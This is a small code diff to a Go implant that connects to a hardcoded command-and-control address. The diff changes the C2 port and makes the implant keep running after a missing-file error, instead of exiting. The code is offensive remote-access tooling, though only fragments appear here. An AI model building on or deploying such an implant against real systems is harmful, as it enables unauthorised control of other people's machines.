@@ -142,7 +142,7 @@ func ls(conn *net.Conn, implantWD *string) {
 }
 
 func main() {
-	c2Address := "192.168.0.104:1234"
+	c2Address := "192.168.0.104:9000"
 	attempts := 0
 	implantWD, _ := os.Getwd()
 	fmt.Println("Implant Started")
@@ -212,7 +212,7 @@ func main() {
 					fmt.Println("The binary does not exist !!! Path: " + filePath)
 					fmt.Println()
 					conn.Write([]byte("File does not exist"))
-					return
+					continue
 				}
 				conn.Write([]byte("OK\n"))
 				fmt.Println("The file exists and is readable: " + filePath)
